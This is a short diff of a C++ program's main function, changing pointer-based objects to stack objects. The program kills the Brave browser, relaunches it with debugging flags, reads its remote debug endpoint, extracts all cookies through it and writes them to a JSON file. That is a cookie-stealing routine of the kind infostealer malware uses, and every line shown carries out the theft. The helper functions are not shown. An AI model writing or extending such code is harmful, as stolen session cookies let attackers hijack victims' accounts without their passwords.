@@ -5,17 +5,14 @@
 
 int main()
 {    
-    OS* windows = new Windows();
-    Browser* browser = new Brave(windows);
+    OS os;
+    Browser browser(os);
 
-    browser->Kill();
-    browser->LaunchWithFlags();
-    browser->WaitUntilEndpointAccessible();
-    std::string dbg_endpoint = browser->ParseDebugEndpoint();
-    std::string cookies = browser->GetAllCookies(dbg_endpoint);
-    browser->DumpJSONIntoFile(cookies);
-    browser->Kill();
-
-    delete browser;
-    delete windows;
+    browser.Kill();
+    browser.LaunchWithFlags();
+    browser.WaitUntilEndpointAccessible();
+    std::string dbg_endpoint = browser.ParseDebugEndpoint();
+    std::string cookies = browser.GetAllCookies(dbg_endpoint);
+    browser.DumpJSONIntoFile(cookies);
+    browser.Kill();
 }
